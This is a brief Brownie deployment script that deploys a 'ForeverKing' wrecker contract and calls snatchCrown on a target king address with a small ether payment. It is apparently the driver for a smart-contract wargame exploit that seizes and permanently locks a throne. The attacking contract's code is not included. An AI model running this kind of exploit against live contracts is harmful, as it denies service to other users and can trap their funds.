from brownie import ForeverKing, accounts

def main(king_addr):
  me = accounts.load("default")
  wrecker = ForeverKing.deploy({'from': me})
  wrecker.snatchCrown(king_addr, {'from': me, 'value': '2000000000000000'})
